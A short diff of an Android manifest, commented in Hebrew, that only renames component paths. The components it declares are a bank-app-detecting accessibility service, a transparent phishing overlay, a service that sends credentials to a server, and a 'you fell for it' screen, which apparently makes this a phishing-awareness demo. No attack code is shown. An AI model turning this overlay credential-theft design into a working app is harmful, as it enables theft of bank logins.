@@ -23,7 +23,7 @@
 
         <!-- מסך ראשי של האפליקציה -->
         <activity
-            android:name=".MainActivity"
+            android:name=".activities.MainActivity"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -33,7 +33,7 @@
 
         <!-- השירות שמזהה את פתיחת אפליקציית הבנק -->
         <service
-            android:name=".PhishingAccessibilityService"
+            android:name=".services.PhishingAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="false">
             <intent-filter>
@@ -46,7 +46,7 @@
 
         <!-- ה-Activity השקופה שמציגה את מסך הפישינג -->
         <activity
-            android:name=".PhishingOverlayActivity"
+            android:name=".activities.PhishingOverlayActivity"
             android:theme="@style/OverlayTheme"
             android:exported="false"
             android:excludeFromRecents="true"
@@ -56,12 +56,12 @@
 
         <!-- השירות ששולח את המידע לשרת -->
         <service
-            android:name=".CredentialSendService"
+            android:name=".services.CredentialSendService"
             android:exported="false" />
 
         <!-- מסך "נפלת בפח" -->
         <activity
-            android:name=".CaughtActivity"
+            android:name=".activities.CaughtActivity"
             android:exported="false"
             android:theme="@style/OverlayTheme"
             android:excludeFromRecents="true"
